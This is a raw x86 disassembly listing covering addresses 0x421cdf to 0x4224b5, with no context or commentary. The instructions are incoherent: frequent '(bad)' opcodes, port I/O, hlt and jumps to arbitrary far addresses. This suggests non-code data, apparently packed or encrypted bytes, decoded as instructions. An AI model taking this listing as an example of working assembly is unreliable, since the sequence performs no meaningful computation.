  421cdf:	add    edx,DWORD PTR [esi+0x5c5c5625]
  421ce5:	cmp    DWORD PTR [ebp+0x3086c00e],edi
  421ceb:	pop    ds
  421cec:	xor    edx,edx
  421cee:	mov    bl,0x6f
  421cf0:	push   edi
  421cf1:	hlt    
  421cf2:	cld    
  421cf3:	adc    eax,0xa1d911d1
  421cf8:	push   edx
  421cf9:	and    edx,DWORD PTR [esi-0x5578cf99]
  421cff:	stos   BYTE PTR es:[edi],al
  421d00:	fistp  WORD PTR [edi]
  421d02:	xadd   BYTE PTR [eax],al
  421d05:	retf   0xb906
  421d08:	pop    esp
  421d09:	in     eax,dx
  421d0a:	in     al,0xcb
  421d0c:	test   eax,0xde6f6640
  421d11:	stc    
  421d12:	cmc    
  421d13:	loopne 0x421d6a
  421d15:	pop    ebp
  421d16:	xor    BYTE PTR [edi-0x12c79167],0x43
  421d1d:	fstp   QWORD PTR [edi]
  421d1f:	jns    0x421d4f
  421d21:	clc    
  421d22:	outs   dx,DWORD PTR ds:[esi]
  421d23:	add    al,0x95
  421d25:	outs   dx,DWORD PTR ds:[esi]
  421d26:	sbb    dh,BYTE PTR [ebp-0x72f524d1]
  421d2c:	push   ebp
  421d2d:	leave  
  421d2e:	sub    bl,BYTE PTR [eax+eiz*8]
  421d31:	and    eax,0xd16cc9a1
  421d36:	mov    ah,0x9c
  421d38:	adc    dh,al
  421d3a:	cmp    eax,DWORD PTR [edi-0x479059f2]
  421d40:	cdq    
  421d41:	jns    0x421d09
  421d43:	dec    esp
  421d44:	xchg   edx,eax
  421d45:	push   esp
  421d46:	sbb    eax,0xd553160e
  421d4b:	dec    edx
  421d4c:	dec    edx
  421d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d4e:	mov    ah,0x28
  421d50:	pop    es
  421d51:	scas   eax,DWORD PTR es:[edi]
  421d52:	push   cs
  421d53:	pop    ecx
  421d54:	repz jo 0x421d6b
  421d57:	mov    cl,0xb8
  421d59:	loope  0x421d8c
  421d5b:	dec    ebp
  421d5c:	pop    ds
  421d5d:	div    bh
  421d5f:	aas    
  421d60:	jbe    0x421dda
  421d62:	(bad)  
  421d64:	daa    
  421d65:	cmp    BYTE PTR [ecx-0x3cddedf0],dl
  421d6b:	xchg   edi,esi
  421d6d:	sub    al,0xe3
  421d6f:	xlat   BYTE PTR ds:[ebx]
  421d70:	dec    edx
  421d71:	fdivr  QWORD PTR [ebp+0x51047003]
  421d77:	out    0x61,eax
  421d79:	fdivrp st(3),st
  421d7b:	push   es
  421d7c:	push   ebp
  421d7d:	in     eax,0x57
  421d7f:	lds    ebx,FWORD PTR [edi]
  421d81:	int3   
  421d82:	lock dec edx
  421d84:	dec    edi
  421d85:	xchg   ecx,eax
  421d86:	xchg   ebp,eax
  421d87:	sbb    esp,0x29
  421d8a:	out    0xd,eax
  421d8c:	xchg   esp,eax
  421d8d:	imul   ebp,DWORD PTR [edx],0xd316290c
  421d93:	aad    0xe5
  421d95:	std    
  421d96:	inc    esi
  421d97:	frstor [ecx]
  421d99:	push   eax
  421d9a:	mov    gs,WORD PTR [ebx-0x32]
  421d9d:	jmp    0xe10a3d93
  421da2:	test   DWORD PTR [eax-0x232a26d4],ebp
  421da8:	mov    eax,0x879280c
  421dad:	js     0x421ddb
  421daf:	sbb    al,BYTE PTR ss:[bp+si+0x1e]
  421db4:	and    dl,BYTE PTR [ebx]
  421db6:	(bad)  
  421db7:	in     al,dx
  421db8:	xchg   edx,eax
  421db9:	stos   DWORD PTR es:[edi],eax
  421dba:	push   edx
  421dbb:	daa    
  421dbc:	and    edx,DWORD PTR [eax]
  421dbe:	dec    ecx
  421dbf:	dec    eax
  421dc0:	cmp    cl,cl
  421dc2:	sar    BYTE PTR [eax-0x607fb2d3],0xc3
  421dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dca:	scas   al,BYTE PTR es:[edi]
  421dcb:	inc    edi
  421dcc:	push   ss
  421dcd:	cmp    esi,DWORD PTR [ecx+0x4b47cc78]
  421dd3:	popf   
  421dd4:	sub    al,0xee
  421dd6:	jmp    0x421e0b
  421dd8:	jb     0x421d63
  421dda:	scas   eax,DWORD PTR es:[edi]
  421ddb:	or     BYTE PTR [edi+0x7339e7a1],al
  421de1:	push   0xb08b74fc
  421de6:	psubsb mm1,QWORD PTR [edx+edx*8]
  421dea:	push   ds
  421deb:	inc    edi
  421dec:	jns    0x421e39
  421dee:	pushf  
  421def:	in     al,dx
  421df0:	in     eax,dx
  421df1:	pop    esp
  421df2:	inc    ecx
  421df3:	call   0x7767:0x42a0de44
  421dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dfb:	jbe    0x421d8a
  421dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dfe:	jo     0x421dc8
  421e00:	mov    ds:0x13a0579f,al
  421e05:	call   0x3b16be3f
  421e0a:	in     al,0x49
  421e0c:	aam    0xd9
  421e0e:	lahf   
  421e0f:	jmp    0x421e4b
  421e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e12:	or     eax,0xd7e65c88
  421e17:	mov    es,ecx
  421e19:	adc    eax,0xa1f7bc23
  421e1e:	fwait
  421e1f:	push   esi
  421e20:	retf   
  421e21:	xchg   DWORD PTR [ebp-0x7f33813f],esp
  421e27:	adc    eax,0x2a160f8b
  421e2c:	push   0x4382abdf
  421e31:	and    esp,DWORD PTR [edx+0x3d]
  421e34:	out    dx,al
  421e35:	xor    esi,edi
  421e37:	repnz xor ebx,DWORD PTR [ebx+edi*8-0x4a]
  421e3c:	jmp    0x421dcc
  421e3e:	cwde   
  421e3f:	in     eax,dx
  421e40:	add    ebp,DWORD PTR [ebx-0xe07baaa]
  421e46:	jl     0x421de0
  421e48:	sub    cl,ch
  421e4a:	or     edi,DWORD PTR [eax]
  421e4c:	xchg   esi,eax
  421e4d:	rep ins DWORD PTR es:[edi],dx
  421e4f:	gs fs das 
  421e52:	sub    esi,DWORD PTR [bx-0x52]
  421e56:	and    cl,bl
  421e58:	das    
  421e59:	push   esp
  421e5a:	jnp    0x421e71
  421e5c:	push   edi
  421e5d:	xchg   edi,eax
  421e5e:	jge    0x421e24
  421e60:	shr    BYTE PTR ds:[edx],cl
  421e63:	mov    eax,0x5121d5af
  421e68:	jmp    0xbc9fe675
  421e6d:	js     0x421e2a
  421e6f:	add    bl,al
  421e71:	sbb    ch,BYTE PTR ds:0xf745c46
  421e77:	mov    al,ds:0x63a11923
  421e7c:	fild   QWORD PTR [edi+0x401fcac8]
  421e82:	sbb    eax,0xbc1836e2
  421e87:	mov    esp,0xcf15956a
  421e8c:	repz dec edi
  421e8e:	xchg   ebx,eax
  421e8f:	push   0x16
  421e91:	out    0xe,eax
  421e93:	bound  eax,QWORD PTR [eax]
  421e95:	das    
  421e96:	or     ecx,DWORD PTR [ebp+0x75]
  421e99:	or     al,0x12
  421e9b:	jns    0x421f1a
  421e9d:	sub    cl,BYTE PTR [ecx-0x27]
  421ea0:	xor    esi,eax
  421ea2:	(bad)  
  421ea3:	dec    ecx
  421ea4:	sbb    esi,esp
  421ea6:	or     al,0x49
  421ea8:	dec    eax
  421ea9:	inc    BYTE PTR [esi-0x70ec6ec2]
  421eaf:	pop    esi
  421eb0:	dec    edx
  421eb1:	repnz xor DWORD PTR [edx+0x425c9b88],esi
  421eb8:	int3   
  421eb9:	sub    ch,BYTE PTR [edx+0x1e]
  421ebc:	(bad)  
  421ebd:	push   eax
  421ebe:	mov    edx,0x308918f9
  421ec3:	sub    eax,0x70463c99
  421ec8:	loope  0x421e8b
  421eca:	fisub  DWORD PTR [edx+edx*4+0x75]
  421ece:	push   ebp
  421ecf:	leave  
  421ed0:	sub    DWORD PTR [esi-0x6f],edx
  421ed3:	outs   dx,DWORD PTR ds:[esi]
  421ed4:	gs ins DWORD PTR es:[edi],dx
  421ed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ed7:	ss mov bl,0x14
  421eda:	pop    eax
  421edb:	outs   dx,BYTE PTR ds:[esi]
  421edc:	lds    edi,FWORD PTR [ecx+eax*8+0x74]
  421ee0:	aaa    
  421ee1:	mov    DWORD PTR [ebp-0x310501e8],ecx
  421ee7:	mov    ebx,0xe5321ca2
  421eec:	inc    esi
  421eed:	xchg   ebp,eax
  421eee:	rcl    DWORD PTR ds:0xe87721d7,cl
  421ef4:	cmp    al,0x94
  421ef6:	and    dh,BYTE PTR [eax+0x4]
  421ef9:	mov    eax,0x6ab623b9
  421efe:	and    eax,0x8f0e959
  421f03:	neg    DWORD PTR ds:0x329afdc8
  421f09:	jb     0x421f1d
  421f0b:	lods   al,BYTE PTR ds:[esi]
  421f0c:	retf   
  421f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f0e:	sub    bl,BYTE PTR [ebp+0x165e9135]
  421f14:	xchg   ecx,eax
  421f15:	retf   
  421f16:	mul    BYTE PTR [edx+0x53]
  421f19:	sbb    eax,0xabe61a8a
  421f1e:	mov    esp,0xae9c084e
  421f23:	ja     0x421f6c
  421f25:	inc    edx
  421f26:	mov    cl,0xd3
  421f28:	push   ss
  421f29:	dec    esi
  421f2a:	int    0xfe
  421f2c:	mov    ds:0x8d6908ad,eax
  421f31:	fisubr DWORD PTR [eax]
  421f33:	or     ax,0x6ef
  421f37:	cmp    BYTE PTR ds:0x58197ea1,al
  421f3d:	xchg   ebx,eax
  421f3e:	in     al,dx
  421f3f:	xchg   DWORD PTR [esi+0x6d5a71f1],eax
  421f45:	dec    edi
  421f46:	xchg   edx,eax
  421f47:	ret    0xfe30
  421f4a:	jg     0x421f04
  421f4c:	and    BYTE PTR [ebx],bl
  421f4e:	lahf   
  421f4f:	xor    al,0x9c
  421f51:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  421f53:	xchg   esi,ebp
  421f55:	shr    DWORD PTR [eax+ecx*2+0x7d6bda34],1
  421f5c:	lea    edx,[ecx+0x11e23592]
  421f62:	push   es
  421f63:	add    cl,BYTE PTR [ebx]
  421f65:	pop    ds
  421f66:	jmp    0xfb08:0xc53b8328
  421f6d:	into   
  421f6e:	xor    al,0xe2
  421f70:	adc    eax,0xee617429
  421f75:	sbb    eax,0xdbb8d830
  421f7a:	inc    edi
  421f7b:	into   
  421f7c:	jp     0x421f4f
  421f7e:	xchg   edi,eax
  421f7f:	in     eax,dx
  421f80:	stos   BYTE PTR es:[edi],al
  421f81:	mov    ch,0x42
  421f83:	fistp  QWORD PTR [esi+0x5ed5263d]
  421f89:	jmp    0xca990b72
  421f8e:	mov    ds:0xa7dfea72,eax
  421f93:	mov    DWORD PTR [ecx+0x79],0x486b3a88
  421f9a:	ds aad 0x3b
  421f9d:	jnp    0x421f43
  421f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fa0:	ror    BYTE PTR [esi-0x3a],1
  421fa3:	push   0xffffff82
  421fa5:	cmp    eax,0x8679dc4d
  421faa:	(bad)  [eax-0x4267af8f]
  421fb0:	xor    edx,DWORD PTR [ebp+esi*1+0x36d1dbb0]
  421fb7:	mov    edi,0xae0aecfd
  421fbc:	std    
  421fbd:	test   eax,0xe6c37345
  421fc2:	mov    ds,WORD PTR [esi+0x609243b8]
  421fc8:	sbb    edx,DWORD PTR [edi]
  421fca:	arpl   WORD PTR [ebx],bp
  421fcc:	cmp    dl,BYTE PTR [ebx-0x709b1f60]
  421fd2:	mov    ds:0xfcda1002,al
  421fd7:	push   ebx
  421fd8:	push   0x18dd5c5e
  421fdd:	push   esi
  421fde:	xchg   ecx,eax
  421fdf:	cmc    
  421fe0:	fcom   QWORD PTR [eax]
  421fe2:	lods   al,BYTE PTR ds:[esi]
  421fe3:	scas   al,BYTE PTR es:[edi]
  421fe4:	out    dx,eax
  421fe5:	sbb    esi,DWORD PTR [ecx+eax*2-0x40]
  421fe9:	neg    BYTE PTR [esi+0x3e9a9321]
  421fef:	ret    
  421ff0:	cs ss jb 0x421ff6
  421ff4:	retf   0xf462
  421ff7:	ss dec eax
  421ff9:	call   0x3025869
  421ffe:	stos   BYTE PTR es:[edi],al
  421fff:	(bad)  
  422000:	gs das 
  422002:	into   
  422003:	jl     0x42207f
  422005:	out    0xc3,eax
  422007:	cdq    
  422008:	lods   eax,DWORD PTR ds:[esi]
  422009:	or     BYTE PTR [eax-0x62],bl
  42200c:	es ret 0xc22c
  422010:	inc    ebp
  422011:	mov    bl,0xd5
  422013:	and    esp,DWORD PTR [esi]
  422015:	mov    bh,0x24
  422017:	lea    edx,gs:[ecx]
  42201a:	fsub   QWORD PTR [eax+0x1d1c8699]
  422020:	jecxz  0x422058
  422022:	mov    al,0x3f
  422024:	jl     0x422075
  422026:	sub    edi,DWORD PTR [ebx+0x1216a91b]
  42202c:	xor    eax,0x5071555e
  422031:	push   ecx
  422032:	popa   
  422033:	push   es
  422034:	sbb    eax,DWORD PTR [edx]
  422036:	or     al,0x57
  422038:	cmp    BYTE PTR [ecx+eax*2+0x18],0x7f
  42203d:	mov    BYTE PTR [esp+ecx*2],bl
  422040:	push   ds
  422041:	mov    cl,bh
  422043:	test   DWORD PTR [ebp+0x8e21894],edx
  422049:	xor    DWORD PTR [edi+0x12],ebp
  42204c:	cwde   
  42204d:	cmp    al,0x63
  42204f:	test   al,0xe8
  422051:	iret   
  422052:	jb     0x421ffb
  422054:	ret    
  422055:	pop    edx
  422056:	inc    ebx
  422057:	sub    eax,0x704550ed
  42205c:	(bad)  
  42205e:	(bad)  
  42205f:	cwde   
  422060:	(bad)  
  422061:	in     al,dx
  422062:	mov    ebp,DWORD PTR es:[edx]
  422065:	fsub   QWORD PTR [ebp+0x45]
  422068:	enter  0xd9b,0x91
  42206c:	mov    ebp,0x6f019b61
  422071:	fucomip st,st(0)
  422073:	or     dh,BYTE PTR [eax+0x62]
  422076:	sub    BYTE PTR [ebp+0xa],ch
  422079:	xchg   edx,eax
  42207a:	pop    edx
  42207b:	sti    
  42207c:	adc    eax,0x2a1c1ed6
  422081:	mov    dl,0x6c
  422083:	and    al,0xb8
  422085:	loop   0x4220c8
  422087:	ret    0x7596
  42208a:	mov    cl,0x1d
  42208c:	ins    BYTE PTR es:[edi],dx
  42208d:	fs out 0x49,eax
  422090:	shl    DWORD PTR [edi+0x375b74c8],0xe4
  422097:	cmc    
  422098:	xchg   ebp,eax
  422099:	loope  0x4220cf
  42209b:	mov    ds:0x66c858b2,eax
  4220a0:	and    ch,cl
  4220a2:	sbb    bl,BYTE PTR [ebx]
  4220a4:	hlt    
  4220a5:	pop    edx
  4220a6:	sub    dl,BYTE PTR [edx-0x1a]
  4220a9:	(bad)  
  4220ab:	jge    0x42210a
  4220ad:	cdq    
  4220ae:	jne    0x42209c
  4220b0:	or     al,0xdd
  4220b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220b3:	fsubr  st,st(7)
  4220b5:	inc    ebx
  4220b6:	pop    esp
  4220b7:	inc    edx
  4220b8:	or     eax,0x692d90e7
  4220bd:	in     al,0xa5
  4220bf:	jl     0x42206d
  4220c1:	cdq    
  4220c2:	mov    ecx,0xcca92023
  4220c7:	call   0xc704365d
  4220cc:	in     eax,dx
  4220cd:	xchg   edx,eax
  4220ce:	jmp    0xd870:0x96429ed5
  4220d5:	imul   edi,DWORD PTR [ecx],0xffffffdc
  4220d8:	imul   esp,DWORD PTR [ebp-0x54d1be74],0x3c2243d5
  4220e2:	stc    
  4220e3:	cmc    
  4220e4:	cmp    DWORD PTR [edx+0x6c716265],ecx
  4220ea:	pop    edx
  4220eb:	lods   eax,DWORD PTR ds:[esi]
  4220ec:	shr    BYTE PTR [edi-0xf],0xfb
  4220f0:	div    bh
  4220f2:	pop    ecx
  4220f3:	xchg   edx,esi
  4220f5:	pop    eax
  4220f6:	aad    0x5c
  4220f8:	out    0x35,al
  4220fa:	push   ss
  4220fb:	push   eax
  4220fc:	bound  esp,QWORD PTR [edi]
  4220fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220ff:	jne    0x4220e9
  422101:	inc    edx
  422102:	mov    bl,0xbe
  422104:	push   edi
  422105:	and    al,0x95
  422107:	pop    es
  422108:	fstp   QWORD PTR [edi-0x1a3f92f4]
  42210e:	(bad)  [esi+esi*8]
  422111:	popf   
  422112:	mov    ds:0xe59f4b5,al
  422117:	jp     0x422113
  422119:	arpl   WORD PTR [edx-0x6],dx
  42211c:	ss jp  0x422170
  42211f:	cmp    eax,DWORD PTR [esi+0x7b]
  422122:	retf   
  422123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422124:	out    dx,al
  422125:	mov    dh,0x66
  422127:	push   0xb4a1affc
  42212c:	pop    ds
  42212d:	aam    0xa2
  42212f:	rol    BYTE PTR [ebx+0x1f],0x6d
  422133:	add    ah,0xb3
  422136:	jae    0x422106
  422138:	push   ebp
  422139:	das    
  42213a:	jg     0x422199
  42213c:	or     DWORD PTR [esi+0x5cffb90c],edx
  422142:	ror    DWORD PTR [edx],cl
  422144:	dec    eax
  422145:	cmp    bh,BYTE PTR ds:0xff7bb695
  42214b:	repz adc BYTE PTR [ecx+0x1268bf5d],ah
  422152:	pop    esi
  422153:	lahf   
  422154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422155:	inc    ebx
  422156:	into   
  422157:	icebp  
  422158:	xor    al,0x42
  42215a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42215b:	(bad)  
  42215c:	ffreep st(7)
  42215e:	das    
  42215f:	hlt    
  422160:	ds jnp 0x4221df
  422163:	sar    dl,0x10
  422166:	int    0xb7
  422168:	cld    
  422169:	clc    
  42216a:	mov    cs,ecx
  42216c:	data16 js 0x4221ba
  42216f:	adc    edx,esi
  422171:	inc    edi
  422172:	push   ss
  422173:	adc    dl,BYTE PTR [ecx+0x48188b4]
  422179:	dec    ebp
  42217a:	not    DWORD PTR [esp+eiz*2+0x1b]
  42217e:	and    DWORD PTR [edi+esi*8-0xe],ecx
  422182:	or     al,0xd9
  422184:	mov    ?,WORD PTR [ebx-0x7f8a02b]
  42218a:	xor    BYTE PTR [edi-0x43fc6a5e],dl
  422190:	inc    ecx
  422191:	iret   
  422192:	and    eax,DWORD PTR [edi+ecx*8]
  422195:	sar    DWORD PTR [esi-0x80],0x41
  422199:	popa   
  42219a:	hlt    
  42219b:	repz jo 0x4221ab
  42219e:	sub    al,0x8b
  4221a0:	add    eax,DWORD PTR [ecx]
  4221a2:	jmp    0x4221d0
  4221a4:	xchg   esi,eax
  4221a5:	std    
  4221a6:	jb     0x4221cf
  4221a8:	sbb    BYTE PTR [ecx+0x23a5a212],0x36
  4221af:	and    ebp,DWORD PTR ds:[ebx+0x2b]
  4221b3:	call   0xdd77:0xa6e975db
  4221ba:	(bad)  
  4221bc:	push   esi
  4221bd:	add    ah,BYTE PTR [eax+0x11]
  4221c0:	sbb    al,0xe2
  4221c2:	sbb    ah,BYTE PTR [ebp+0x58]
  4221c5:	mov    DWORD PTR [esi],edx
  4221c7:	jmp    0xc1b16f0
  4221cc:	jns    0x422172
  4221ce:	adc    ebx,DWORD PTR [edx+0x280464bd]
  4221d4:	add    dl,BYTE PTR [ebx-0x30]
  4221d7:	pop    ds
  4221d8:	xchg   ecx,eax
  4221d9:	mov    BYTE PTR [ecx-0x17ea1a31],ch
  4221df:	inc    ebx
  4221e0:	xor    DWORD PTR [edi-0x408f16ce],0xffffffbd
  4221e7:	pusha  
  4221e8:	mov    edi,0x2ae9e5ce
  4221ed:	mov    cl,0x9e
  4221ef:	and    eax,0x327ecbd6
  4221f4:	push   0xffffffb7
  4221f6:	push   edi
  4221f7:	or     bh,BYTE PTR [edi]
  4221f9:	cmp    dl,cl
  4221fb:	sbb    bh,BYTE PTR [ecx]
  4221fd:	pop    ss
  4221fe:	shr    bl,1
  422200:	push   esp
  422201:	call   DWORD PTR [ebx]
  422203:	clc    
  422204:	stc    
  422205:	popa   
  422206:	or     al,0xae
  422208:	stos   BYTE PTR es:[edi],al
  422209:	sbb    eax,0x3118996b
  42220e:	mov    ebp,0x9c5aa3b4
  422213:	stos   DWORD PTR es:[edi],eax
  422214:	aam    0x9c
  422216:	clc    
  422217:	lods   eax,DWORD PTR ds:[esi]
  422218:	mov    esi,0x3a4cbbe1
  42221d:	or     bl,bh
  42221f:	je     0x42220e
  422221:	mov    cl,0x95
  422223:	sahf   
  422224:	dec    edi
  422225:	xor    DWORD PTR [esi],edi
  422227:	dec    ebp
  422228:	mov    al,ds:0xd374a83b
  42222d:	int    0x59
  42222f:	push   edi
  422230:	retf   0x33c2
  422233:	inc    ebx
  422234:	jp     0x422245
  422236:	sbb    DWORD PTR [ebx+0xc5adb17],ecx
  42223c:	adc    al,0xf9
  42223e:	dec    edx
  42223f:	or     DWORD PTR [edi-0x7219c9a2],ecx
  422245:	(bad)  
  422246:	push   esp
  422247:	xor    ch,BYTE PTR [esi+0x27]
  42224a:	arpl   WORD PTR [ecx],si
  42224c:	cmp    DWORD PTR ds:0xddcbe2da,0xffffffd7
  422253:	jno    0x422219
  422255:	adc    eax,0xd3b70cc5
  42225a:	cwde   
  42225b:	jge    0x4222c1
  42225d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42225e:	xchg   esi,eax
  42225f:	mov    edx,DWORD PTR gs:[edx]
  422262:	xchg   ebp,eax
  422263:	pop    edx
  422264:	inc    edx
  422265:	fild   QWORD PTR [edx+0x16fd6697]
  42226b:	push   esi
  42226c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42226d:	inc    eax
  42226e:	int    0x8a
  422270:	xor    dl,BYTE PTR [esp+ecx*2-0x3b556fc3]
  422277:	cmp    eax,0x5ede88de
  42227c:	popa   
  42227d:	sub    DWORD PTR [eax+0x45],eax
  422280:	scas   al,BYTE PTR es:[edi]
  422281:	stos   BYTE PTR es:[edi],al
  422282:	xchg   ebx,eax
  422283:	or     eax,DWORD PTR [edx+eiz*8]
  422286:	rcl    dl,1
  422288:	or     edx,DWORD PTR [eax+0x2f]
  42228b:	cmp    DWORD PTR ds:0xe544924e,edx
  422291:	sbb    eax,ecx
  422293:	mov    esp,0x7d46cb2a
  422298:	retf   
  422299:	fistp  QWORD PTR [esp+eax*4-0x35640e88]
  4222a0:	mov    esi,0x5050f82d
  4222a5:	push   ebx
  4222a6:	push   es
  4222a7:	adc    dh,BYTE PTR [ebx+0x457e103a]
  4222ad:	je     0x4222d2
  4222af:	rcr    DWORD PTR [ecx-0x2ceb99eb],cl
  4222b5:	les    ebx,FWORD PTR cs:0x72ad6481
  4222bc:	gs jg  0x4222c1
  4222bf:	jne    0x4222af
  4222c1:	stos   DWORD PTR es:[edi],eax
  4222c2:	fstp   TBYTE PTR [edx-0x518c4e19]
  4222c8:	sti    
  4222c9:	fldcw  WORD PTR [eax]
  4222cb:	fld    TBYTE PTR [ecx+0x79ac5d1a]
  4222d1:	(bad)
  4222d5:	and    BYTE PTR [eax+eiz*8+0x6dfd5693],0xd
  4222dd:	cdq    
  4222de:	rcl    BYTE PTR ds:0xf16747b9,1
  4222e4:	push   ebx
  4222e5:	sahf   
  4222e6:	pushf  
  4222e7:	mov    WORD PTR [edi-0x2d],?
  4222ea:	or     BYTE PTR [ebp-0xf324f60],cl
  4222f0:	jp     0x4222c6
  4222f2:	xor    esi,DWORD PTR ds:0x6b5286c6
  4222f8:	sbb    al,0x42
  4222fa:	pop    ecx
  4222fb:	out    0xe9,eax
  4222fd:	enter  0x3dce,0x9a
  422301:	jae    0x422326
  422303:	sahf   
  422304:	int3   
  422305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422306:	dec    ebp
  422307:	jo     0x422375
  422309:	or     BYTE PTR [ebp+0x14],dh
  42230c:	in     al,0xbe
  42230e:	push   cs
  42230f:	or     bh,BYTE PTR [ecx-0x25272c93]
  422315:	cdq    
  422316:	push   0x3c6f0e70
  42231b:	or     al,0x24
  42231d:	pop    ds
  42231e:	out    0x8a,al
  422320:	adc    BYTE PTR [edi+0xfca4d58],dl
  422326:	add    ebp,DWORD PTR [esi-0x20e5a291]
  42232c:	nop
  42232d:	fisubr WORD PTR [ecx+0x6b8fe952]
  422333:	in     eax,dx
  422334:	and    DWORD PTR es:[edi+0x286db9e7],0x26611300
  42233f:	and    dl,BYTE PTR [edi+0x11]
  422342:	and    al,0x9e
  422344:	scas   eax,DWORD PTR es:[edi]
  422345:	jnp    0x42236b
  422347:	mov    dh,0xdc
  422349:	(bad)  
  42234a:	mov    ebp,0xcd0b203d
  42234f:	xor    edi,DWORD PTR [ebx]
  422351:	mov    bl,0xf4
  422353:	and    ecx,edx
  422355:	ss push ecx
  422357:	push   ds
  422358:	lods   al,BYTE PTR ds:[esi]
  422359:	or     ch,BYTE PTR [ebp+0x777f1372]
  42235f:	xchg   esi,eax
  422360:	dec    esp
  422361:	jbe    0x422351
  422363:	lea    ecx,[ecx+0x30]
  422366:	inc    ebp
  422367:	popa   
  422368:	mov    WORD PTR [edi+0x1d],gs
  42236b:	pop    ecx
  42236c:	xchg   ecx,eax
  42236d:	call   0xb8ed2e1f
  422372:	push   esp
  422373:	daa    
  422374:	cs out dx,al
  422376:	lea    esi,[edx]
  422378:	xsaveopt [esi+eiz*1-0x7bd4c831]
  422380:	mov    cl,0xb0
  422382:	aaa    
  422383:	xchg   esi,eax
  422384:	into   
  422385:	adc    eax,0xd57ee822
  42238a:	jp     0x4223ea
  42238c:	cwde   
  42238d:	(bad)  
  42238e:	mov    eax,0x63df9907
  422393:	add    DWORD PTR [ecx+0x76a5cb0c],edx
  422399:	int    0xae
  42239b:	loop   0x4223b1
  42239d:	call   0x4ba3:0x9356d3c7
  4223a4:	push   eax
  4223a5:	je     0x4223d2
  4223a7:	pop    ds
  4223a8:	jle    0x422337
  4223aa:	cs mov bh,0xec
  4223ad:	cli    
  4223ae:	jbe    0x422410
  4223b0:	and    DWORD PTR [edi+0x62],esp
  4223b3:	rcr    BYTE PTR [ebp-0x56],cl
  4223b6:	sub    BYTE PTR [edx],dh
  4223b8:	add    BYTE PTR [ecx-0x7a],dh
  4223bb:	jl     0x42238e
  4223bd:	pop    edx
  4223be:	add    ah,BYTE PTR [ebx]
  4223c0:	hlt    
  4223c1:	jmp    0xd016a62e
  4223c6:	inc    esp
  4223c7:	retf   0x55a4
  4223ca:	dec    ebp
  4223cb:	inc    ebx
  4223cc:	aas    
  4223cd:	fsub   st(3),st
  4223cf:	hlt    
  4223d0:	out    0xd0,al
  4223d2:	fadd   st,st(6)
  4223d4:	lods   al,BYTE PTR es:[esi]
  4223d6:	enter  0x6937,0xad
  4223da:	xchg   esp,eax
  4223db:	xor    bh,BYTE PTR [ebp-0x5c]
  4223de:	in     al,0xc7
  4223e0:	outs   dx,BYTE PTR ds:[esi]
  4223e1:	jo     0x422387
  4223e3:	cmp    DWORD PTR ss:[ebx-0xf40fd49],ebp
  4223ea:	mov    al,0xca
  4223ec:	adc    esp,ecx
  4223ee:	push   ebp
  4223ef:	imul   esi,ecx,0xce3a811e
  4223f5:	in     eax,dx
  4223f6:	push   0x37
  4223f8:	or     DWORD PTR [ebp+0x7c],esi
  4223fb:	mov    WORD PTR [esi+0x2c],es
  4223fe:	repz mov ch,dh
  422401:	scas   eax,DWORD PTR es:[edi]
  422402:	mov    ds:0xf4c14da3,eax
  422407:	or     al,0x15
  422409:	pop    edi
  42240a:	scas   eax,DWORD PTR es:[edi]
  42240b:	add    eax,0xf4de73dc
  422410:	scas   eax,DWORD PTR es:[edi]
  422411:	mov    ds:0x435e924f,eax
  422416:	cmp    esp,DWORD PTR [ebx]
  422418:	xchg   edi,eax
  422419:	mov    cl,0x23
  42241b:	cwde   
  42241c:	ret    0xbf12
  42241f:	shl    DWORD PTR [edi-0x38accfd9],0x81
  422426:	aaa    
  422427:	jmp    0x75555ae2
  42242c:	jnp    0x422431
  42242e:	mov    edx,0x5cc91b78
  422433:	or     DWORD PTR [ebx-0x2c],edi
  422436:	mov    ds:0xe89e7604,eax
  42243b:	or     eax,0xb456d697
  422440:	jns    0x422473
  422442:	mov    eax,ds:0x1e795657
  422447:	aad    0x91
  422449:	jbe    0x4223cc
  42244b:	out    dx,al
  42244c:	cmp    eax,0x34c79426
  422451:	mov    BYTE PTR [ecx-0x58],bl
  422454:	xor    dh,BYTE PTR [edx+0x7b]
  422457:	and    eax,0xb7859839
  42245c:	xor    al,0x1d
  42245e:	ins    BYTE PTR es:[edi],dx
  42245f:	jb     0x42241e
  422461:	xchg   esp,eax
  422462:	xor    eax,0x1b0026b0
  422467:	sub    ch,cl
  422469:	ficom  DWORD PTR [ebx+0x22441faa]
  42246f:	int    0x39
  422471:	scas   eax,DWORD PTR es:[edi]
  422472:	shr    BYTE PTR [ebp+0x1f],0xd5
  422476:	mov    ecx,DWORD PTR [edi+0x4eee8740]
  42247c:	ret    
  42247d:	das    
  42247e:	repnz mov ch,0xf5
  422481:	pop    ebp
  422482:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  422484:	in     al,dx
  422485:	dec    edx
  422486:	mov    ds:0xdb7ab7c1,eax
  42248b:	add    esp,ebp
  42248d:	add    BYTE PTR [edx-0x4e1534cf],0x9d
  422494:	mov    eax,ds:0xcc0de09a
  422499:	mov    ss,WORD PTR [esi+0x39]
  42249c:	jp     0x4224f7
  42249e:	dec    edi
  42249f:	or     eax,0x4dc4f3f0
  4224a4:	mov    bh,cl
  4224a6:	imul   edi,DWORD PTR [eax+0x51],0x2c
  4224aa:	daa    
  4224ab:	cmp    eax,0xf6136c4c
  4224b0:	mov    dh,0x27
  4224b2:	lds    edx,FWORD PTR [eax-0x11]
  4224b5:	mov    al,0xb
